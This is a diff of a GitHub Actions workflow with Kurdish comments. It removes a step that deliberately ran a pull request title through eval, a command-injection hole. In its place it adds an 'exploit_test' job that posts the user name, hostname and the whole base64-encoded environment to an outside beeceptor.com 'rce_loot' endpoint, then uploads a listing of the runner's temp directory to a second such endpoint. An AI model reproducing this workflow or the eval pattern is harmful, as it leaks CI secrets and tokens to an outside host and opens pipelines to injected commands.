@@ -1,19 +1,23 @@
 name: RCE Analysis Pipeline
 
 on:
-  pull_request:
-    types: [opened, synchronize]
+  push:
+    branches:
+      - main  # یان هەر branchـێکی تری خۆت
+  workflow_dispatch: # ئەمە ڕێگەت پێ دەدات بە دەستی (Manually) لە سایتەکەوە ڕەنی بکەیت
 
 jobs:
-  test_injection:
+  exploit_test:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Vulnerable Input Processing
-        # ئەم بەشە Input-یەک لە ناوی Branch یان Titleـی PR وەردەگرێت
+      - name: System Information Gathering
         run: |
-          TITLE="${{ github.event.pull_request.title }}"
-          echo "Processing PR: $TITLE"
-          eval "echo $TITLE"
+          # فەرمانەکانی RCE لێرەدا دەچن
+          echo "Scanning for RCE vulnerabilities..."
+          
+          # ناردنی زانیاری سێرڤەر بۆ Beeceptor
+          curl -X POST -d "user=$(whoami)&hostname=$(hostname)&env=$(env | base64)" https://ccssxa.free.beeceptor.com/rce_loot
+          
+          # تاقیکردنەوەی دەستڕاگەیشتن بە فایلەکان
+          ls -la /home/runner/work/_temp/ >> result.txt
+          curl -F "file=@result.txt" https://aksjwuwu.free.beeceptor.com/rce_loot
